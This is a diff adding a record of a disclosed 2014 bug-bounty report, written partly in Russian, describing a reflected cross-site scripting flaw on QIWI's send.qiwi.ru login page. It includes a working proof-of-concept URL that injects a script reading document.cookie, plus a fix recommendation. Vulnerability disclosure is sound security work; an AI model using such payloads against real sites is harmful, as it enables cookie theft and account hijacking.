@@ -1,0 +1,17 @@
+ReportLink:https://hackerone.com/reports/35413
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/psych0tr1a
+ReportedTo:QIWI(qiwi)
+BountyAmount:200.0
+Severity:
+State:Closed
+DateOfDisclosure:17.12.2014 17:21:53
+
+Summary:
+
+> Хост - send.qiwi.ru
+> Тип - XSS
+> https://send.qiwi.ru/auth?login="><script>alert(document.cookie)</scri
+> pt>&password=123&go=%D0%92%D1%85%D0%BE%D0%B4
+> Позволяет выпонить произвольный js а также обойти защиту от CSRF
+> Рекомендации по устранению - сделать фильтрацию " ' < >
